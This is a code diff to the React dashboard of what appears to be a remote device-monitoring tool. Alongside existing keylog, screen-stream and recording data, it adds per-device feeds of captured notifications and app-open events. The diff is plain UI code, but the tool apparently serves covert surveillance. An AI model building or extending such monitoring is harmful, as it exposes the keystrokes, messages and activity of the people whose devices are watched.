@@ -14,6 +14,8 @@ export default function App() {
   const [activityLog, setActivityLog] = useState([]);
   const [streamFrames, setStreamFrames] = useState({});
   const [keylogPushEntries, setKeylogPushEntries] = useState([]);
+  const [notifPushEntries, setNotifPushEntries] = useState([]);
+  const [activityAppEntries, setActivityAppEntries] = useState([]);
 
   const handleMessage = useCallback((event, data) => {
     switch (event) {
@@ -100,6 +102,21 @@ export default function App() {
         }
         break;
 
+      case 'notification:push':
+        if (data && data.deviceId) {
+          setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
+        }
+        break;
+
+      case 'activity:app_open':
+        if (data && data.deviceId) {
+          setActivityAppEntries(prev => {
+            if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
+            return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
+          });
+        }
+        break;
+
       case 'recording:started':
       case 'recording:saved':
       case 'recording:error':
@@ -136,6 +153,8 @@ export default function App() {
               streamFrame={streamFrames[selectedDevice] || null}
               send={send}
               keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
+              notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
+              activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
             />
           ) : (
             <Overview
